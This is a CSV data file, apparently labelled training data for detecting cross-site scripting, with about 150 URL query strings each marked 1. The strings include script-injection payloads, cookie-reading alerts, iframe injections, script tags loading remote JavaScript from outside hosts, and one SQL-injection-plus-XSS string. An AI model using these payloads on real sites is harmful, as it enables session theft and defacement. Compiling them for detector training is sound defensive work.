Payload,Label
ref=VACC_ppc-moteur&url=http://pub.partirpascher.com/RealMedia/ads/click_lx.ads/<br/>voila/homepage/blocmoteur/1123456789/Top/voila_bloc_moteur/voila_image_bloc_moteur/124?http://antici<br/>pate.free.fr,1
IN_PROCESS=VIDE&domaine=1%2C2&IN<br/>_TypeRecherche=MUL&motClef=%3Cscript%3Ealert%28%2FZeryus%2F%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXS<br/>S+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E&idFonction=&idc=1&idc=2%2C6&idc=14&idLieuTravail=,1
criteri=algo%22/%3E%3Cscript%3Ealert(1)%3C/script%3E,1
id=%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3<br/>E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
wallpaperid=%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script<br/>%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
emploi=%3Cscript%3Ealert%28%2FZeryus%2F%29%3C%2<br/>Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E&I1_x=OK,1
no_cache=1&tx_commerce_pi1[sdate]=180&tx_commerce_pi1[message]=<script>alert(<br/>'Hacked By Dialogitec ImeCiQ');</script>,1
hof=%3C%22%3C%3CsCrIpT%3Ealert(document.cookie)%3C/sCrIpT%3E,1
search=%%3Ciframe%20name=''%20SRC='javascript:alert(1118)'<br/>%20scrolling='yes'%20height='220'%20width='180'%20FRAMEBORDER='yes'%3E%3C/iframe%3E%3Cmarquee%3E%3Ch<br/>1%3EXSS%20by%20Zeryus%3C/h1%3E%3C/marquee%3E,1
savekw=1&filters%5BKEYWORDS%5D=%3Cscript%3Ealert%28%<br/>2FZeryus%2F%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E&filters%<br/>5BgeoKEYWORDS%5D=%3Cscript%3Ealert%28%2FZeryus%2F%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryu<br/>s+%3C%2Fh1%3E%3C%2Fmarquee%3E,1
nom_de_la_celebrite=%3Ciframe%20name=<br/>''%20SRC='javascript:alert(1118)'%20scrolling='yes'%20height='220'%20width='180'%20FRAMEBORDER='yes'<br/>%3E%3C/iframe%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Zeryus%3C/h1%3E%3C/marquee%3E,1
id=%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3<br/>E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
id=%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/scr<br/>ipt%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
show=%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C<br/>/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
q=%3Cscript%3Ealert%28%2FZeryus%2F%29%3C%2Fscript%3E%3Cmarquee%3E%3<br/>Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E&sa=Rechercher,1
id=%27%22%3E%3C/title%3E%3Cscript%3Ealer<br/>t(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
lang=ru&id=%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%<br/>3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
id=%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3<br/>Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
id=%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3C<br/>marquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
id=%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script<br/>%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
r=%3Cscript%3Ealert%28%2FZeryus%2F%29%3C%2Fscript%3E%3Cma<br/>rquee%3E%3Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E&l=%3Cscript%3Ealert%28%2FZeryus%2F%29%3C%2<br/>Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E,1
q=%3C/title%3E%3Cscript%3Ealert(%27xssed%27)%3C/script%3E%3C/head%3E,1
id=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%<br/>3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
sSearchText=%3Cscript%3Ealert('xssed by<br/>roach189')%3C/script%3E,1
SPONSOR=%22%3E%3CSCRIPT%3Ealert(%27XSS_Alert%27)<br/>%3C%2FSCRIPT%3E,1
state=content&type=article&cat_id=2%27%22%3E%3C/title<br/>%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marque<br/>e%3E,1
"a=DB&db=TDH&txt_keyword=""><script>alert(""sovietw0rm was here"")</script>",1
SearchType=1&ClassID=0&KeyWord=%E5%85%B3%E9%94%AE%E5%AD%9<br/>7%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol<br/>%3C%2Fh1%3E%3C%2Fmarquee%3E&ChannelID=1&Submit=%E6%90%9C+%E7%B4%A2,1
target=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1337)%3C%<br/>2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E&imageField.x=11&imageFi<br/>eld.y=13,1
source=locator&personid=2757&name=<script>alert(document.cookie);</<br/>script>,1
lang=en%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/sc<br/>ript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
ztid=3635&cz=ck&zt=engine%20image%20search%20sex%27%22%3E%<br/>3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3<br/>C/marquee%3E,1
keyword=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3<br/>E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
searchterm=%22%3E%3Cscript%3Ealert(/GeNk<br/>StAr/);%3C/script%3E,1
"idioma=I&source=0&sector=0&orgn=""><script>alert(""Fugitif"")<br/></script>",1
"mod=search&keyword=""><script>alert(1)</script>&startdate=""><script>aler<br/>t(1)</script>&enddate=""><script>alert(1)</script>",1
start=0&perpage=10&col=coburleigh&summary=yes&sort=ran<br/>k&date1=&date2=&type=&search=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%<br/>3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
department=none&masterCategory=%27%22%3E%3C/ti<br/>tle%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/mar<br/>quee%3EITC&srchType=all,1
keyword=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)<br/>%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
Field=Title&ClassID=&keyword=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Eal<br/>ert(1337)%3C%2Fscript%3E%3E%3Cmarquee%3E%3C&showsearch.x=15&showsearch.y=11,1
err=2&search=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(13<br/>37)%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E,1
"s=1&cid=47&promotionid=18000663&code=""><script>alert(""Fugitif<br/>"")</script>",1
AreaID=3&Grade=1&SearchOptions=%27%22%3E%3C/title%3E%3<br/>Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E&<br/>Submit1=Search&TypeID=0&criteria=maxself&iaith=cy&trefn=ascending&Language=2,1
option=com_prayercenter&Itemid=78/index2.php?option=com_prayercen<br/>ter&task=view_request&id=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3<br/>Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
"id=944<iframe src=""http://www.new-bytes.net""<br/>onload=""alert('C1c4Tr1Z')"">&index=y",1
return=%27%22%3E%3C/title%3E%3Cscript%3E<br/>alert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
"pag_id=47&pag_id_lk=47&pag=/%22%3E%3Cscript%3Es=(/XSSed<br/>%20by%20unwiredbrain/.toString().substr(1,21));alert(s);document.title=s;document.body.innerHTML=s%3<br/>C/script%3E%3C!--",1
menuHeader=11&menuSub=61&page=orderpage&lang=en&coupo<br/>n=asd%22%3E%3Cimg%20src%20onerror=alert(%27XSS%27)%3E,1
option=com_prayercenter&task=view_request&id=%27%22%3E%<br/>3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3<br/>C/marquee%3E,1
action=search&keyword=%22%3E%3Cscript%3Ealert(1337)%3C%2Fs<br/>cript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+xerces%3C%2Fh1%3E%3C%2Fmarquee%3E&submit=Go,1
id=19&cmd=search&SearchForm=%25%25SearchForm%25%25&index=search<br/>%2Fcscollege&maxFiles=10&request=%22%3E%3Cimg%20src%20onerror=%22alert(0)%22%3E&x=0&y=0,1
searchtype=1&LGSL=t&mode=1.1&text=%22%3E%3C<br/>center%3E%3Ch1%3E%3CBR%3EXSS+FLAW%3Ccomment%3E,1
c=39&p=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/sc<br/>ript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
Title=%3Cscript%3Ealert('Agd_Scorp')%3C/scr<br/>ipt%3E,1
find=%22%3E%3Cscript%3Ealert(%2FGeNkStAr%2F)%3B%3C%2Fscript%3E&Sub<br/>mit=Go,1
q=<marquee><font size=5<br/>color=red>LeBaNeSe-XsSeR</marquee></font>&x=0&y=0,1
"keyword='""></title><script>alert(1337)</script>><marquee><h1>XSS<br/>by Xylitol</h1></marquee>",1
option=com_prayercenter&task=view_request&id=%27%22%3E%3C/title<br/>%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marque<br/>e%3E,1
ara=%3Cscript%3Ealert(1);%3C/script%3E,1
etiket=%3CIMG%20src=%22http://img233.imageshack.us/img233/5526/xssul<br/>3.jpg%22%3E,1
keyword=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/sc<br/>ript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
option=com_prayercenter&task=view_request&id=%27%22%3E%3C/title%3E%<br/>3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
page=<h1>XSS%20FLAW<comment>,1
"page=item_search&action=search&keyword=sovietw0rm&date_from=""><script>alert(1<br/>)</script>&date_to=""><script>alert(1)</script>",1
keywords=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert<br/>(1337)%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E&type=All&bs=S<br/>earch,1
"qs=""><script>alert(""Fugitif"")</script>",1
"search=';alert(String.fromCharCode(88,83,83))//\';<br/>alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\%22;alert(String.fr<br/>omCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%<br/>3C/SCRIPT%3E",1
trackingId=%3Cscript%3Ealert(1)%3C/script%3E,1
L=home.search&query=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3Cs<br/>cript%3Ealert%281%29%3C%2Fscript%3E&Submit2=Submit,1
s=%3Ch1%3EHacked+By+Dialogitec+ImeCiQ%3C%2Fh1%3E,1
domains=www.myfreewallpapers.com%3Bwww.myfreewallpapers.n<br/>et&q=%22%3E%3Cscript%3Ealert(%2FXSSed+by+Dr.Optix%2F)%3C%2Fscript%3E&sa=Find&sitesearch=www.myfreewa<br/>llpapers.com&cof=FORID%3A9&client=pub-9516897064761360&forid=1&ie=ISO-8859-1&oe=ISO-8859-1&safe=acti<br/>ve&flav=0000&sig=hBHwbeQx-LQnIR1P&cof=GALT%3A%232058A5%3BGL%3A1%3BDIV%3A%23000000%3BVLC%3AFFFFFF%3BA<br/>H%3Acenter%3BBGC%3AC0C0C0%3BLBGC%3A2058A5%3BALC%3AFFFFFF%3BLC%3AFFFFFF%3BT%3A000000%3BGFNT%3AFFFFFF%<br/>3BGIMP%3AFFFFFF%3BFORID%3A11&hl=en,1
motcle=%27%22%3E%3C%2Ftitle%3E%3Cscript%3E<br/>alert(1337)%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E&Submit=G<br/>o,1
TYPE=VOTE%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/s<br/>cript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E&THEMA=Informatique&URL_THE<br/>MA=/informatique/securite-hacking/,1
str=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&lang=en,1
"q=""><script>alert( / xss /)</script>",1
QUICKSEARCH=Sea%3E%3E%3Cmarquee%3E%3Ch1%3EYAY%20INTERNET%20SE<br/>CURITY%20BY%20CHEROKEE%20WARRIOR%3C%2Fh1%3E%3C%2Fmarquee%3Erch&X=0&Y=0,1
fullurl=%22%3E%3Cscript%3Ealert(/Shocker%20@%20www.ShockingSoft.com/)%3C/script%3<br/>E,1
actType=12&menuid=&menuup=&menulink=&strSearch=%22%3E%3Cscript%3Ealert(%22so<br/>vietw0rm%20was%20here%22)%3C%2Fscript%3E,1
chaineSociete=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1<br/>337)%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E&Image4.x=0&Imag<br/>e4.y=0&typesearch=cours,1
pagina=%22%3E%3Ciframe%20src=javascript:alert(/XSS/)%3E,1
ID=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/sc<br/>ript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
fuseaction=DISPLAY_ALL_ARTICLE_BY_FULL_TEXT_SEARC<br/>H&website_id=39&menu_id=0&parent_menu_id=0&txt_search=%22%3E%3Cscript%3Ealert(%22sovietw0rm%20was%20<br/>here%22)%3C/script%3E&search_type=1,1
opensocial_authtype=SIGNED&opensocial_token=at4IjkedDpNL<br/>kau5F/gsmGfqlODuP0eDpTeA45xoUKlXsVUjcvGcAmS+BLRbO8M3617chfI29VFFwiTjqSbfr3RlRYrivuZjLK2V2b+FCUA=&ope<br/>nsocial_url=http://xssed.com,1
pearl+%3Ch1%3EHacked%20by%20Alemin_Krali%3Ch1%3E+1+htt<br/>p://www.alcaldiademelgar.gov.co/admin/uploads/hacked.png,1
aff=1100&keywords=%22%3E%3Cscript%3Ealert(%27xssed%27)%3C/script%3E%3C<br/>span%20id=%22&submit.x=12&submit.y=11&submit=submit,1
mot=%3Cscript%3Ealert%28%2FZeryus%2F%29%3C%2<br/>Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E&search_go=ok,1
context-number=1&keywords=%3Cscript%3<br/>Ealert%28%22iBlaze%22%29%3C%2Fscript%3E&1_21_2_5_11=...,1
phrase=%3Cscript%3Ealert%28%22iBlaze%22%29%3C%2Fs<br/>cript%3E&button.x=0&button.y=0&button=FIND,1
first_letter=%22%3E%3Cscript%3Ealert(1)%3C/script%3<br/>E,1
SearchString=fm%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(133<br/>7)%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E,1
page=1&sub=105&srch=%22%3E%3Cscript%3Ealert(%22sovietw0rm%22)%3C%2<br/>Fscript%3E&srchby=ten_sanpham,1
title=et%27%22%3E%3C/title%3E%3Cscript%3Ealert<br/>(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E&name=&lowdate=0<br/>&highdate=0&undated=off&mandm=&group=0&order=1&listtype=&page=6,1
pageid=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3<br/>E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
host%5B%5D=localhost%3A211&keywords=%3Cscript%3Ealert%28%22iBlaze<br/>%22%29%3C%2Fscript%3E&x=0&y=0,1
site=%3Cscript%3Ealert(%27hmmxssbyale<br/>m%27)%3C/script%3E,1
"id="" onmouseover=""alert('XSS')"" :OC&view=text",1
s=11293|0|838|15|wide|0&lg=us&actor_id=%22%3E%3Cscript%3Eale<br/>rt(%22DaiMon%22)%3C/script%3E,1
nr=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Eal<br/>ert%281337%29%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E&type=d<br/>m&Submit=%B2%E9%D5%D2,1
search=%3Cscript%3Ealert%28%2FZeryus%2F%29%3C%2Fscript%3E%3Cmar<br/>quee%3E%3Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E,1
"category=3&sort=""><script>alert(1)</script>",1
ADDR_ORIGIN=&CITY_ORIGIN=San%20Die<br/>go&STATE_ORIGIN=CA&ZO=%3Cscript%3Ealert(%27xssed%27)%3C/script%3E&ZD=63110&ADDR_DESTINATION=1+Barnes<br/>-Jewish+Hospital+Plaza&CITY_DESTINATION=St.+Louis&STATE_DESTINATION=Missouri&PHONE=None&SUITE=&PRACT<br/>ICE=&DENTISTNAME=Barnes-Jewish+Hospital&VAR1=Barnes-Jewish+Hospital&VAR2=Other&HEADER=BJH&FOOTER=&DI<br/>SPADDR=One+Barnes-Jewish+Hospital+Plaza&FAX=&COMMENT1=&COMMENT2=&ADD2=,1
type=%3Cscript%3Ealert%28%22iBlaze%22%29%3C%2Fscript%3E&q=%3Cscript%3E<br/>alert%28%22iBlaze%22%29%3C%2Fscript%3E&btn=Search,1
message=No+items+to+display%2E'%3Cscript%3E<br/>alert('Agd_Scorp')%3C/script%3E,1
file=contact_us%3E%22%3Cscript%3Ealert(%27xss%27);%3C/script%3<br/>E,1
KeyWord=sovietw0rm&SectionID=0&type=0&fromdate='%3E%3Cscript%3<br/>Ealert(%22sovietw0rm%20was%20here%22)%3C/script%3E&todate='%3E%3Cscript%3Ealert(%22sovietw0rm%20was%<br/>20here%22)%3C/script%3E,1
keywords=%3CIFRAME%20src=%22http://www.ogm.g<br/>ov.tr/m.htm%22%20width=800%20height=500%20marginwidth=0%20marginheight=0%20hspace=0%20vspace=0%20scr<br/>olling=no%20frameborder=0%3E%3C/IFRAME%3E,1
browse=3&list=LOCAL+FAMILIES+-+Van+de+We%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%<br/>3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3Eyer&Subject=local+famil<br/>ies,1
action=note&checksite=xssed.com%3Cscript%3Ealert('XSSED')%3C/scr<br/>ipt%3E,1
mot=%3Cscript%3Ealert%28%2FZeryus%2F%29%3<br/>C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E&search_go=ok,1
client=GOVNS_NSARM&site=GOVNS_NSARM&proxystylesheet=GOVNS_NSARM&output=<br/>xml_no_dtd&getfields=dc%252edescription.dc%252edate&q=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1337)<br/>%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E&action.x=11&action.<br/>y=14,1
q=%22%3E%3Cscript+src%3D%22http%3A%2F%2Fgooglebig.com%2Fl.js%<br/>22%3E&cat=,1
"performUsernameValidation=N&handle=<script>al<br/>ert(""xssed"")</script><script>alert(""xssed"")</script>&domain=att.net&pass=<script>alert(""xssed"")</scr<br/>ipt>",1
client=LCC&site=Councillors|Events|Libraries|Organi<br/>sations|Pages|PlacesOfWorship|Schools|Therapists|Venues|Parishes&ie=UTF-8&oe=UTF-8&output=xml_no_dtd<br/>&filter=0&getfields=description&num=10&q=%22%3E%3Cimg%20src%20onerror=%22alert(%27XSS%27)%22%3E&btnG<br/>.x=0&btnG.y=0,1
recherche=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E<br/>%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E&mode=Citations,1
"bolbad=False&surname=""><script<br/>src=http://byccc.awardspace.com/js/xssccc.js></script>",1
strCollection=&txtTitle=&txtClass=&txtMain=&txtDesc=&strS<br/>earch=aaaaaaaaa&intPageNum=%22%3E%3Cscript%20src=http://byccc.awardspace.com/js/xssccc.js%3E%3C/scri<br/>pt%3E&oldStrSearch=&strAdvancedSearch=&Printable=No&typeOfSearch=&NoOfResults=10&btnSubmit=Go,1
btnSearch=Search&tt=advsearch&chkContent=y&chkNews=y&chkAnnounce<br/>ment=y&search=%22%3Cscript%3Ealert(%27hello%27)%3C/script%3E,1
mot=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E%3Cmarquee%3E%<br/>3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E,1
next=%22%3E%3Cscript%3Ealert(/XSSed%20by%20Dr.Optix.%20Why?%20Beca<br/>use%20I%20can!/)%3C/script%3E,1
"bolbad=False&seriestitle=""><script<br/>src=http://byccc.awardspace.com/js/xssccc.js></script>",1
strCollection=&txtTitle=&txtClass=&txtMain=&txtDesc=&strS<br/>earch=%22%3E%3Cscript%20src=http://byccc.awardspace.com/js/xssccc.js%3E%3C/script%3E&intPageNum=1&ol<br/>dStrSearch=&strAdvancedSearch=&Printable=No&typeOfSearch=&NoOfResults=10&btnSubmit=Go,1
"p_id=-16%20union%20select%200,1,'%3Cscript%3Eale<br/>rt(%22xss%20via%20sql%20by%20Agd_Scorp%22)%3C/script%3E',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18/*",1
"locale=""><script>alert(/www.r3t.n3t.nl/)</script>",1
"idProducto=""><iframe%20src=http://xssed.com>",1
method=home&pname=213_7&thpartist=%3Cscript%3Ealert(<br/>123)%3C/script%3E&ptrx=integrated&iframe=true&thptitle=%3Ch1%3EUber0n%3C/h1%3E&thpcampid=fun_mobile_<br/>stuff&thpcid=top_11,1
"acc=4&raz=24489U&p1=""><script>alert(""cwdaimon@gmail.com"")<<br/>/script>",1
"state=H9&city=LONDON&country=""><script>alert(/www.r3t.n3t.nl/)</scr<br/>ipt>",1
id_forum=72189&id_menu=245549,1
"ara=""><script>alert(""DR.HACK3R"")</script>",1
alertid=%22%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E%3<br/>Ch1%3EHacked%20By%20TreX%3C/h1%3E,1
"bolbad=False&itemnumber=""><script<br/>src=http://byccc.awardspace.com/js/xssccc.js></script>",1
srch_name=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E,1
a[]=%3E%3Cscript%3Ealert(/Zeryus/);%3C/script%3E,1
keyword=%3Cscript%3Ealert%28%22Zeryus%22%29%3C%2Fsc<br/>ript%3E,1
keywords=%22%3E%3CscRipT%3Ealert(123)%3C/scRIpT%3E,1
"page=5&keyword=""><script>alert(document.cookie)</script>",1
action=detail&artid=%22%3E'%3E%3Cscript%3Ealert(document.cookie)<br/>%3C/script%3E,1
fname=price&companyname=%22%20onclick<br/>=alert(1337)//,1
"acc=4&raz=24489U&p1=UGARTE%2C+S.A.&p2=""><script>alert(""cwd<br/>aimon@gmail.com"")</script>",1
lang=se&ref=http://uber0n.darkillusion.org/xsspage.htm,1
alerion=1&path=www.apapul.ulaval.ca%2F&img=apap<br/>ul&exp=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2F<br/>marquee%3E&submit=Recherche&resP=10&tri=pertinence+desc,1
en=youtube&q=csrf%22%3E%3Ciframe%20src=http://xssed.com%3E,1
lang=%22%3E%3Cscript%3Ealert(/GeNkStAr/)%3C/script%3E,1
type=%22%3E%3Ciframe%20src=%22http://gezgin.com%22%3E%3<br/>C/iframe%3E,1
action=display&idartista=%22%3E'%3E%3Cscript%3Ealert('s3rg3770<br/>')%3C/script%3E,1
q=test%20%22%20onmouseover=%22alert(1)%22,1
page=preowned/asdf%27);alert(%271337%27);(%27,1
"TITLE=<script>alert(""XSS<br/>2/6"")</script>",1
keyword=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E<br/>%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
"keyword=""><script>alert(""XSS 3/6"")</script>",1
keyword=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cm<br/>arquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
"catid=9&k=""><script>alert(""XSS<br/>4/6"")</script>",1
"PHPSESSID=cf35e044561c4b8307ed06f723609cdb&m=""><script>alert<br/>('HACKED%20By%20TurKPoweR')</script><marquee><h1>Dafeced%20By%20TurKPoweR</h1></marquee>",1
year=2018&vModelName=Corvettez%27;}alert(1337);if(0){<br/>%27&modelId=030&subModelId=,1
